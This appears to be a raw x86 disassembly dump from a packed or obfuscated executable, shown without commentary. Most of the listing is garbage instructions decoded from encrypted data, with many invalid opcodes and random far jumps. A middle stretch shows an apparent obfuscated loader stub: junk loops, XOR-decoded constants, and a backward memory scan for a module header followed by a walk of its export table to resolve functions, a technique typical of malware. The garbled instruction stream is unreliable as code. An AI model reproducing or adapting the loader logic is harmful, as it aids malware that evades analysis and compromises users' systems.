  40e1a2:	into   
  40e1a3:	inc    ecx
  40e1a4:	jl     0x40e164
  40e1a6:	fisttp QWORD PTR [edi]
  40e1a8:	call   0x2492:0x8c6919ef
  40e1af:	out    dx,al
  40e1b0:	jge    0x40e1d8
  40e1b2:	cmp    BYTE PTR [ebx-0x6a],ch
  40e1b5:	inc    ebx
  40e1b6:	add    eax,0xfdc478c
  40e1bb:	jmp    0xd5ea:0x3c421c12
  40e1c2:	jo     0x40e17a
  40e1c4:	or     al,0xc4
  40e1c6:	inc    ebx
  40e1c7:	pusha  
  40e1c8:	and    BYTE PTR [edx],ch
  40e1ca:	test   BYTE PTR [esp+edx*4+0x56],ch
  40e1ce:	and    al,0x41
  40e1d0:	lahf   
  40e1d1:	sar    ah,1
  40e1d3:	and    dh,BYTE PTR [ebp-0x63]
  40e1d6:	pop    eax
  40e1d7:	jo     0x40e201
  40e1d9:	idiv   DWORD PTR [ebx+0x4ed4e4a6]
  40e1df:	scas   eax,DWORD PTR es:[edi]
  40e1e0:	adc    ecx,DWORD PTR [edx]
  40e1e2:	mov    ebp,0xbc4f086b
  40e1e7:	jno    0x40e203
  40e1e9:	ins    DWORD PTR es:[edi],dx
  40e1ea:	push   ss
  40e1eb:	test   bl,dl
  40e1ed:	lock mov ebx,0xfd4ac596
  40e1f3:	sub    BYTE PTR [ebp-0x65],dl
  40e1f6:	and    BYTE PTR [edi+0x73],cl
  40e1f9:	push   ebp
  40e1fa:	mov    WORD PTR [eax],es
  40e1fc:	stos   BYTE PTR es:[edi],al
  40e1fd:	add    al,bl
  40e1ff:	adc    eax,DWORD PTR [eax]
  40e201:	mov    ?,WORD PTR [bp+0x38d7]
  40e206:	jg     0x40e234
  40e208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e209:	or     al,0x9c
  40e20b:	stos   DWORD PTR es:[edi],eax
  40e20c:	nop
  40e20d:	sub    al,BYTE PTR [ebx-0x80]
  40e210:	cli    
  40e211:	fild   QWORD PTR [ebp-0x20]
  40e214:	in     eax,0x66
  40e216:	xchg   esp,eax
  40e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e218:	imul   eax,DWORD PTR [ebx],0xf0344437
  40e21e:	sbb    al,0x40
  40e220:	mov    eax,0x202b8685
  40e225:	mov    dl,0xd0
  40e227:	nop
  40e228:	clc    
  40e229:	xchg   ebx,eax
  40e22a:	dec    ebp
  40e22b:	outs   dx,BYTE PTR ds:[esi]
  40e22c:	inc    edi
  40e22d:	dec    eax
  40e22e:	pop    ds
  40e22f:	inc    esp
  40e230:	loopne 0x40e1b3
  40e232:	call   0x8015:0xc3a32682
  40e239:	sub    DWORD PTR [ecx-0x15],ebx
  40e23c:	mov    edi,0x335019f9
  40e241:	or     bh,BYTE PTR [esi-0x4f]
  40e244:	or     ebp,DWORD PTR [esi+edi*1]
  40e247:	stos   DWORD PTR es:[edi],eax
  40e248:	xchg   edx,eax
  40e249:	icebp  
  40e24a:	(bad)
  40e24d:	sbb    ah,BYTE PTR [esi+0x1784c0f9]
  40e253:	add    eax,DWORD PTR [edi]
  40e255:	xor    eax,0xa5fa0492
  40e25a:	jo     0x40e2cd
  40e25c:	daa    
  40e25d:	shl    al,0x68
  40e260:	je     0x40e222
  40e262:	mov    ds:0x55a94e6c,al
  40e267:	retf   0xba30
  40e26a:	xchg   esp,eax
  40e26b:	in     eax,0xc7
  40e26d:	or     eax,0x422ddc5
  40e272:	mov    eax,DWORD PTR [ecx-0x1dd4d861]
  40e278:	sub    esp,DWORD PTR [edx+0xa3c0357]
  40e27e:	sbb    al,0x2a
  40e280:	cmp    DWORD PTR [ecx-0x65],esp
  40e283:	gs call 0xcdc4783
  40e289:	or     eax,0x45f09080
  40e28e:	test   eax,0x92aee1f5
  40e293:	shl    BYTE PTR [ecx+eax*8+0x6fff2036],0x9d
  40e29b:	dec    esi
  40e29c:	ins    DWORD PTR es:[edi],dx
  40e29d:	pop    eax
  40e29e:	jno    0x40e2bf
  40e2a0:	mov    WORD PTR [edi-0x3],ds
  40e2a3:	out    dx,al
  40e2a4:	jecxz  0x40e306
  40e2a6:	punpckhwd mm0,QWORD PTR [ebp-0x23]
  40e2aa:	fcom   QWORD PTR [ebx]
  40e2ac:	test   eax,0x243693a7
  40e2b1:	dec    edi
  40e2b2:	popa   
  40e2b3:	adc    al,bh
  40e2b5:	das    
  40e2b6:	int    0x17
  40e2b8:	mov    dl,al
  40e2ba:	test   ax,0x9446
  40e2be:	xchg   BYTE PTR [esp+ecx*8],ah
  40e2c1:	sbb    al,0x58
  40e2c3:	ret    
  40e2c4:	cmp    bh,BYTE PTR [edx-0x2fee0d05]
  40e2ca:	xor    BYTE PTR [eax+0x1f],ah
  40e2cd:	ret    0x5ef1
  40e2d0:	adc    esp,DWORD PTR [ebp-0x2e2c7480]
  40e2d6:	mov    ebp,0x8f58136e
  40e2db:	sbb    eax,0x18ed3721
  40e2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2e1:	xchg   eax,esi
  40e2e3:	test   eax,0x31fc0e31
  40e2e8:	pop    ebx
  40e2e9:	jp     0x40e2e2
  40e2eb:	adc    bl,0x6f
  40e2ee:	adc    al,0x73
  40e2f0:	jmp    0xd56d8ddd
  40e2f5:	cmc    
  40e2f6:	ja     0x40e375
  40e2f8:	sbb    BYTE PTR [ebp-0x57134a4d],dh
  40e2fe:	arpl   ax,si
  40e300:	pop    edx
  40e301:	dec    edi
  40e302:	fnstcw WORD PTR [ecx-0x2fe4bdce]
  40e308:	and    al,0xbb
  40e30a:	push   edi
  40e30b:	inc    ebp
  40e30c:	or     al,0x45
  40e30e:	jmp    0x36f45fe5
  40e313:	or     al,0x5c
  40e315:	inc    esi
  40e316:	(bad)  
  40e317:	xlat   BYTE PTR ds:[ebx]
  40e318:	test   bh,bh
  40e31a:	mov    dl,0x54
  40e31c:	inc    edx
  40e31d:	cdq    
  40e31e:	loop   0x40e38d
  40e320:	push   ebx
  40e321:	cmp    al,ch
  40e323:	sub    eax,0xc1a6bb32
  40e328:	mov    ah,0xcd
  40e32a:	jl     0x40e33e
  40e32c:	(bad)  [esi]
  40e32e:	mov    dh,0xc5
  40e330:	and    DWORD PTR [ebx-0x75],esp
  40e333:	mov    eax,ds:0x21bd8f81
  40e338:	push   esi
  40e339:	xor    esp,DWORD PTR [ebp-0x44]
  40e33c:	xchg   edi,eax
  40e33d:	js     0x40e34b
  40e33f:	sub    BYTE PTR [esi-0x32],dh
  40e342:	ins    DWORD PTR es:[edi],dx
  40e343:	call   0xcd12:0x2c1ba8db
  40e34a:	pusha  
  40e34b:	pop    ebp
  40e34c:	outs   dx,BYTE PTR ds:[esi]
  40e34d:	xchg   ebx,eax
  40e34e:	push   ebx
  40e34f:	push   0xffffffae
  40e351:	add    eax,0x40799d53
  40e356:	inc    ebx
  40e357:	mov    fs,WORD PTR [ecx-0x44]
  40e35a:	(bad)  
  40e35b:	pop    ebx
  40e35c:	int3   
  40e35d:	das    
  40e35e:	and    eax,0x66d7d775
  40e363:	push   ds
  40e364:	xchg   DWORD PTR [edi-0x27],ebx
  40e367:	xlat   BYTE PTR ds:[ebx]
  40e368:	mov    al,ds:0x8a9aaf16
  40e36d:	sub    BYTE PTR [ebp-0x18],0x24
  40e371:	(bad)  [esi+ebp*1-0x14]
  40e375:	out    dx,eax
  40e376:	sub    DWORD PTR [edi],esp
  40e378:	sub    al,BYTE PTR [ecx+0xfc203f1]
  40e37e:	scas   eax,DWORD PTR es:[edi]
  40e37f:	push   es
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x572e5ef2
  40e671:	ja     0x40e6d6
  40e673:	jae    0x40e63f
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e6c4
  40e67c:	mov    ebp,0x917a2de5
  40e681:	sbb    esp,ecx
  40e683:	(bad)
  40e686:	call   0x8f4a:0xf83b7c2c
  40e68d:	test   eax,0xdc6fb9bb
  40e692:	and    DWORD PTR [edx+0x6618bede],edx
  40e698:	and    ebp,DWORD PTR [edi-0x1ae2f069]
  40e69e:	push   ebp
  40e69f:	dec    esi
  40e6a0:	jg     0x40e706
  40e6a2:	sub    DWORD PTR [ecx-0x568cba93],0x55
  40e6a9:	push   0xe887617b
  40e6ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6af:	adc    DWORD PTR [eax+0x63567532],0xffffffc8
  40e6b6:	loope  0x40e69a
  40e6b8:	adc    dh,bl
  40e6ba:	pop    edx
  40e6bb:	inc    ebx
  40e6bc:	dec    esi
  40e6bd:	dec    ecx
  40e6be:	sub    BYTE PTR [esi],ah
  40e6c0:	test   eax,0x3c2102c
  40e6c5:	jb     0x40e6b1
  40e6c7:	pop    ecx
  40e6c8:	cmc    
  40e6c9:	arpl   WORD PTR [edx-0x3a38d95e],ax
  40e6cf:	(bad)  
  40e6d0:	ins    BYTE PTR es:[edi],dx
  40e6d1:	push   0xc98580e0
  40e6d6:	adc    eax,0x311b1f23
  40e6db:	mov    ecx,0x69a16018
  40e6e0:	fdiv   DWORD PTR [edx]
  40e6e2:	inc    edi
  40e6e3:	jmp    esi
  40e6e5:	popf   
  40e6e6:	fs (bad) 
  40e6e8:	push   edx
  40e6e9:	aaa    
  40e6ea:	jnp    0x40e743
  40e6ec:	ja     0x40e708
  40e6ee:	xor    BYTE PTR [ecx+0x5097a9e6],dh
  40e6f4:	cmp    ch,BYTE PTR [esp+esi*4+0x5]
  40e6f8:	xchg   ebx,eax
  40e6f9:	mov    cl,0xc
  40e6fb:	jecxz  0x40e6d6
  40e6fd:	int3   
  40e6fe:	mov    al,ds:0x65293eed
  40e703:	aam    0x21
  40e705:	jmp    0xb984adf6
  40e70a:	mov    ch,0x77
  40e70c:	xchg   edi,eax
  40e70d:	dec    ebp
  40e70e:	mov    ds,eax
  40e710:	int    0xb5
  40e712:	inc    esi
  40e713:	fldl2e 
  40e715:	pop    ebx
  40e716:	in     eax,0x3c
  40e718:	mov    edi,0xf2abfe6d
  40e71d:	in     al,dx
  40e71e:	and    ch,BYTE PTR [edx-0x6f]
  40e721:	inc    eax
  40e722:	mov    al,0x39
  40e724:	cmp    edi,esp
  40e726:	xor    ecx,DWORD PTR [ecx]
  40e728:	sbb    DWORD PTR [ebx+edx*2-0x15],edx
  40e72c:	push   ebx
  40e72d:	jmp    FWORD PTR [edx+0x34]
  40e730:	xor    al,0x91
  40e732:	add    DWORD PTR [eax-0x447081f0],eax
  40e738:	or     al,0x2e
  40e73a:	test   DWORD PTR ds:0x35a4fac6,edi
  40e740:	and    BYTE PTR [edi-0x6b558515],0xbc
  40e747:	mov    eax,0xf247cfc2
  40e74c:	jp     0x40e705
  40e74e:	and    BYTE PTR [eax+0x11e242dd],bh
  40e754:	xor    eax,0xf6fedbe3
  40e759:	jl     0x40e6ea
  40e75b:	push   ebp
  40e75c:	cli    
  40e75d:	loop   0x40e73e
  40e75f:	data16 adc al,0x72
  40e762:	shl    DWORD PTR [ebx],1
  40e764:	call   0x10794887
  40e769:	sub    DWORD PTR [ebx+0x7d6e8acc],edi
  40e76f:	(bad)  
  40e770:	mov    esi,0x485c59fa
  40e775:	jge    0x40e767
  40e777:	fs xor eax,0xa4c0ebba
  40e77d:	loop   0x40e75a
  40e77f:	imul   esp,esp,0xd27209e8
  40e785:	xchg   DWORD PTR [ecx-0x75],esp
  40e788:	push   ss
  40e789:	retf   
  40e78a:	je     0x40e7be
  40e78c:	sbb    DWORD PTR [edi],edi
  40e78e:	ss pop ss
  40e790:	fldenv [eax+0x35cc2c06]
  40e796:	jl     0x40e744
  40e798:	mov    ebx,0x82fd2460
  40e79d:	inc    eax
  40e79e:	std    
  40e79f:	fld    TBYTE PTR [ebx-0x75]
  40e7a2:	dec    eax
  40e7a3:	out    0x9d,eax
  40e7a5:	and    al,0xcd
  40e7a7:	out    0x4d,al
  40e7a9:	(bad)  
  40e7aa:	ds dec esi
  40e7ac:	mov    al,0x37
  40e7ae:	push   0xe59e7440
  40e7b3:	adc    ah,ch
  40e7b5:	jne    0x40e806
  40e7b7:	test   edi,esp
  40e7b9:	xchg   edx,eax
  40e7ba:	test   eax,0xa74628
  40e7bf:	and    ecx,DWORD PTR [edx+eax*8+0x5f]
  40e7c3:	pop    esi
  40e7c4:	call   0xa4e5:0x185ee5fe
  40e7cb:	sbb    eax,0x9f123e4b
  40e7d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d1:	and    al,0xe2
  40e7d3:	cmp    eax,esi
  40e7d5:	pop    ds
  40e7d6:	mov    edi,0xb5369e9b
  40e7db:	bound  esi,QWORD PTR [ebx]
  40e7dd:	mov    ebp,0xf2738c91
  40e7e2:	push   0x8683192b
  40e7e7:	in     al,0x8a
  40e7e9:	and    edi,DWORD PTR [ecx-0x13]
  40e7ec:	popa   
  40e7ed:	inc    esi
  40e7ee:	mov    ebp,0x923e1395
  40e7f3:	fldcw  WORD PTR [eax+eiz*4-0x36a29f6d]
  40e7fa:	xor    al,0x57
  40e7fc:	or     bl,dl
  40e7fe:	or     esi,eax
  40e800:	push   edi
  40e801:	fidivr DWORD PTR [ebx+ebx*4+0x6af8435c]
  40e808:	test   bl,dh
  40e80a:	adc    eax,0x36ea04bf
  40e80f:	sub    esi,esi
  40e811:	dec    esi
  40e812:	rcr    DWORD PTR [ebx],cl
  40e814:	dec    esi
  40e815:	xchg   esp,eax
  40e816:	(bad)  
  40e819:	mov    ebp,0xb70069f6
  40e81e:	test   BYTE PTR [ebx+0x189f27],cl
  40e824:	xchg   ecx,eax
  40e825:	xor    DWORD PTR [ebx],edi
  40e827:	add    eax,0xde342a47
  40e82c:	jns    0x40e87d
  40e82e:	imul   esp,DWORD PTR [esi-0x66],0x4c2e2b23
  40e835:	aaa    
  40e836:	ds call 0xf6a8:0xe6fd49d3
  40e83e:	cmp    DWORD PTR ds:0xeeaa3ad5,ebx
  40e844:	and    BYTE PTR [eax-0x31e6d98d],bh
  40e84a:	inc    ebx
  40e84b:	push   ebx
  40e84c:	les    esi,FWORD PTR [esi]
  40e84e:	mov    edx,0xf2b8452f
  40e853:	daa    
  40e854:	loop   0x40e833
  40e856:	jo     0x40e7ec
  40e858:	loope  0x40e829
  40e85a:	out    0x14,al
  40e85c:	popf   
  40e85d:	inc    ebp
  40e85e:	hlt    
  40e85f:	dec    edx
  40e860:	cmp    BYTE PTR [ebx+0x47f2aa51],dl
  40e866:	shl    ch,cl
  40e868:	fsubp  st(6),st
  40e86a:	cmp    eax,0xe4611454
  40e86f:	push   ss
  40e870:	rol    bh,0x60
  40e873:	cmp    BYTE PTR [esi],ch
  40e875:	sti    
  40e876:	aam    0x92
  40e878:	(bad)  
  40e879:	mov    eax,ds:0x6fd3eda
  40e87e:	stc    
  40e87f:	inc    ecx
  40e880:	call   0xf64db30e
  40e885:	aam    0x6d
  40e887:	lds    edx,FWORD PTR [eax]
  40e889:	sub    ecx,DWORD PTR [edx]
  40e88b:	dec    eax
  40e88c:	pop    ss
  40e88d:	add    eax,0xe60192f0
  40e892:	xor    BYTE PTR [ebx+0x4c],ch
  40e895:	mov    DWORD PTR [edi-0x52f89228],esp
  40e89b:	mov    ebx,0xac21b654
  40e8a0:	push   ss
  40e8a1:	sahf   
  40e8a2:	es pop ebx
  40e8a4:	inc    ebp
  40e8a5:	mov    ebp,0xa326ef01
  40e8aa:	out    0x4c,al
  40e8ac:	fsubr  st,st(0)
  40e8ae:	pop    ds
  40e8af:	jecxz  0x40e8d6
  40e8b1:	(bad)  
  40e8b2:	fwait
  40e8b3:	jmp    0xd8b81007
  40e8b8:	cmc    
  40e8b9:	js     0x40e8f0
  40e8bb:	scas   al,BYTE PTR es:[edi]
  40e8bc:	adc    al,BYTE PTR [esi]
  40e8be:	mov    ds:0x2a1dc664,al
  40e8c3:	loope  0x40e8e6
  40e8c5:	xor    eax,0x3dc6e1c8
  40e8ca:	push   ds
  40e8cb:	fs cmp edi,esp
  40e8ce:	jno    0x40e8e1
  40e8d0:	lods   al,BYTE PTR ds:[esi]
  40e8d1:	sbb    esp,DWORD PTR [edi-0x25341a9d]
  40e8d7:	aam    0x45
  40e8d9:	push   cs
  40e8da:	(bad)  
  40e8db:	fs dec cl
  40e8de:	push   0xffffff99
  40e8e0:	(bad)  
  40e8e1:	mov    BYTE PTR [esi],0x85
  40e8e4:	aad    0x10
  40e8e6:	push   0x753eee6b
  40e8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ec:	mov    bl,0xdb
  40e8ee:	jle    0x40e8a2
  40e8f0:	mov    esp,DWORD PTR [edi+0x4]
  40e8f3:	std    
  40e8f4:	(bad)
  40e8f8:	sub    al,0xbb
  40e8fa:	rcl    BYTE PTR [ecx-0x77],1
  40e8fd:	(bad)  
  40e8fe:	push   ds
  40e8ff:	jmp    0x40e8f1
  40e901:	add    bl,bh
  40e903:	rcr    BYTE PTR ds:0xf9ca7f43,1
  40e909:	addr16 xor eax,0xcb3b35f
  40e90f:	mov    cl,BYTE PTR [eax+0x5abcb9e5]
  40e915:	xor    DWORD PTR [ebx-0x4a],0x8a4b2cd0
  40e91c:	xor    al,0x3b
  40e91e:	je     0x40e91c
  40e920:	mov    edi,DWORD PTR [ebp+edi*2-0x7d]
  40e924:	and    BYTE PTR ds:0xba9a0556,ch
  40e92a:	xchg   esi,eax
  40e92b:	sbb    dl,ch
  40e92d:	loop   0x40e964
  40e92f:	gs xchg ecx,eax
  40e931:	mov    eax,ds:0x4e36a1d
  40e936:	mov    eax,ds:0x20764db6
  40e93b:	(bad)  
  40e93c:	btc    DWORD PTR [ebp+0x6ee17799],ebp
  40e943:	cmc    
  40e944:	sub    eax,0x798ddd
  40e949:	outs   dx,BYTE PTR ds:[esi]
  40e94a:	arpl   WORD PTR [edi],ax
  40e94c:	mov    dh,0x8c
  40e94e:	sub    al,0x5e
  40e950:	test   al,0xb2
  40e952:	mov    ebp,0xcc478420
  40e957:	mov    edi,0x58f88363
  40e95c:	push   ecx
  40e95d:	mov    esi,0xddb54d3d
  40e962:	dec    esi
  40e963:	jp     0x40e9bb
  40e965:	iret   
  40e966:	sbb    DWORD PTR [edx+0x6d1e461c],esi
  40e96c:	and    al,0x9b
  40e96e:	add    eax,0x1a2a2874
  40e973:	jae    0x40e9f1
  40e975:	push   ecx
  40e976:	out    0x50,al
  40e978:	ja     0x40e94f
  40e97a:	pop    ecx
  40e97b:	mov    eax,0x4694b829
  40e980:	ja     0x40e960
  40e982:	inc    eax
  40e983:	(bad)  
  40e984:	push   esp
  40e985:	imul   BYTE PTR [eax+0x6265e5ad]
  40e98b:	and    al,0x9b
  40e98d:	mov    ah,0x6e
  40e98f:	pop    ebx
  40e990:	xchg   ecx,eax
  40e991:	(bad)  [esp+ebp*4-0x70]
  40e995:	stc    
  40e996:	fsubr  st,st(4)
  40e998:	mov    al,ds:0x202d9fca
  40e99d:	add    DWORD PTR [ecx-0x1ea16f80],ebp
  40e9a3:	imul   ebx,DWORD PTR [ebp+0x2fc08c59],0x37
  40e9aa:	(bad)  
  40e9ac:	hlt    
  40e9ad:	mov    eax,eax
  40e9af:	cmp    al,BYTE PTR [edx+0x2f1f8084]
  40e9b5:	shl    BYTE PTR [ebp+edx*8-0x441628cb],1
  40e9bc:	jne    0x40e98d
  40e9be:	inc    edx
  40e9bf:	ret    0x874
  40e9c2:	pop    ebx
  40e9c3:	sbb    al,0xdb
  40e9c5:	lods   al,BYTE PTR ds:[esi]
  40e9c6:	fnstsw WORD PTR [esp+eiz*8]
  40e9c9:	into   
  40e9ca:	ss loope 0x40e959
  40e9cd:	jne    0x40ea37
  40e9cf:	xchg   DWORD PTR [ebp+0x7fed6b73],esi
  40e9d5:	inc    esp
  40e9d6:	push   esp
  40e9d7:	cli    
  40e9d8:	mov    bl,0x65
  40e9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9db:	push   ss
  40e9dc:	sar    DWORD PTR [ecx+0x0],cl
  40e9df:	cmc    
  40e9e0:	(bad)
  40e9e4:	xchg   BYTE PTR [ebx+0xe],ch
  40e9e7:	aam    0xea
  40e9e9:	add    al,0x67
  40e9eb:	hlt    
  40e9ec:	push   edx
  40e9ed:	in     eax,dx
  40e9ee:	jmp    0xce4a18b8
  40e9f3:	jbe    0x40ea44
  40e9f5:	call   0x488f:0xac43e3b9
  40e9fc:	push   ebx
  40e9fd:	lods   al,BYTE PTR ds:[esi]
  40e9fe:	cmc    
  40e9ff:	jns    0x40ea2b
  40ea01:	bound  edi,QWORD PTR [eax-0x17]
  40ea04:	dec    ebx
  40ea05:	out    0x93,al
  40ea07:	or     eax,0xd6e7f343
  40ea0c:	ss cli 
  40ea0e:	iret   
  40ea0f:	dec    eax
  40ea10:	jg     0x40e996
  40ea12:	pop    ebp
  40ea13:	retf   
  40ea14:	je     0x40ea10
  40ea16:	xchg   BYTE PTR ds:0x80fbfe66,bl
  40ea1c:	jbe    0x40ea6f
  40ea1e:	nop
  40ea1f:	inc    esp
  40ea20:	call   0x5995:0x10acaeaf
  40ea27:	sub    ebp,ebx
  40ea29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea2a:	dec    edx
  40ea2b:	mov    ebp,0x19aee22d
  40ea30:	je     0x40ea82
  40ea32:	pop    esi
